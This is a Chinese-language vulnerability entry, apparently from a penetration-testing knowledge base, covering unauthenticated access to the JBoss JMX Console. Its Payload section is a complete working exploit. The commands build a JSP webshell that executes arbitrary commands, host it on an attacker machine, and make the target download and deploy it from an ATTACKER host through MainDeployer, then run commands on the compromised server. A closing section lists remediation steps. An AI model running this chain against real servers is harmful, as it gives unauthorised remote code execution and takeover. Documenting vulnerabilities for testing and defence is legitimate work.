---
id: JBOSS-JMXCONSOLE-UNAUTH
title: JBoss JMX Console 未授权访问 WAR 部署
product: jboss
vendor: Red Hat
version_affected: "4.x, 5.x, 6.x"
severity: CRITICAL
tags: [rce, file_upload, war_deploy, 无需认证]
fingerprint: ["JBoss", "AS", "JMX"]
---

## 漏洞描述

JBoss AS 默认安装时 JMX Console（`/jmx-console/`）和 Web Console（`/web-console/`）未设置访问认证，攻击者可直接访问管理控制台。通过 JMX Console 的 `MainDeployer` MBean，攻击者可以远程部署恶意 WAR 包，实现远程代码执行。

## 影响版本

- JBoss AS 4.x
- JBoss AS 5.x
- JBoss AS 6.x

## 前置条件

- 无需认证
- `/jmx-console/` 或 `/web-console/` 可以未授权访问

## 利用步骤

1. 检测 JMX Console 和 Web Console 是否可以未授权访问
2. 在攻击机托管恶意 WAR 包
3. 通过 JMX Console 的 MainDeployer 部署远程 WAR
4. 访问部署的 webshell

## Payload

```bash
# Step 1: 检测未授权访问
curl -s http://TARGET:8080/jmx-console/ -o /dev/null -w "%{http_code}"
curl -s http://TARGET:8080/web-console/ -o /dev/null -w "%{http_code}"
# 200 表示可未授权访问

# Step 2: 准备恶意 WAR 包（在攻击机上）
mkdir webshell && echo '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>' > webshell/cmd.jsp
cd webshell && jar cf ../cmd.war cmd.jsp && cd ..
# 托管 WAR 包
python3 -m http.server 8888

# Step 3: 通过 MainDeployer 部署远程 WAR
curl "http://TARGET:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://ATTACKER:8888/cmd.war"

# Step 4: 访问 webshell
curl "http://TARGET:8080/cmd/cmd.jsp?cmd=id"
```

## 验证方法

```bash
# 检查 JMX Console 是否可访问
curl -sI http://TARGET:8080/jmx-console/ | head -1
# HTTP/1.1 200 OK 表示未授权访问

# 检查 Web Console 是否可访问
curl -sI http://TARGET:8080/web-console/ | head -1

# 部署成功后验证
curl -s "http://TARGET:8080/cmd/cmd.jsp?cmd=whoami"
```

## 修复建议

1. 为 JMX Console 和 Web Console 配置身份认证
2. 限制管理控制台仅允许内网 IP 访问
3. 升级到 WildFly（JBoss 社区版后续版本，默认需要认证）
4. 如非必要，禁用或移除 JMX Console 和 Web Console
